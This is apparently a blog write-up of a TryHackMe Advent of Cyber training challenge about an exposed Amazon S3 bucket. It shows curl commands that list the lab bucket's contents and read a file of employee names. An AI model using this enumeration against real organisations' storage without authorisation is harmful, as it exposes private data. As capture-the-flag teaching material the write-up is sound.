---
title: "Advent of Cyber Day 14 Unknown Storage"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "Advent of Cyber Day 14 Unknown Storage"
secret: true
---

[TryHackMe | Advent of Cyber](https://tryhackme.com/room/25daysofchristmas)

McElferson opens today's news paper and see's the headline

`Private information leaked from the best festival company`

This shocks her! She calls in her lead security consultant to find out more information about this. How do we not know about our own s3 bucket.

McSkidy's only starting point is a single bucket name: **advent-bucket-one**

Check out the supporting material [here](https://docs.google.com/document/d/13uHBw3L9wdDAFboErSq_QV8omb3yCol0doo6uMGzJWo/edit#).

With the supporting material given by TryHackMe we can use the following commands :

### #1 What is the name of the file you found?

```bash
kali@kali:~$ curl advent-bucket-one.s3.amazonaws.com
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
<Name>advent-bucket-one</Name>
<MaxKeys>1000</MaxKeys>
<IsTruncated>false</IsTruncated>
<Contents>
	<Key>"employee_names.txt"</Key>
	<LastModified>2019-12-14T15:53:25.000Z</LastModified>
	<ETag>e8d2d18588378e0ee0b27fa1b125ad58</ETag>
	<Size>7</Size>
	<StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
```

### #2 What is in the file?

```bash
kali@kali:~$ curl advent-bucket-one.s3.amazonaws.com/employee_names.txt
"mcchef"
```
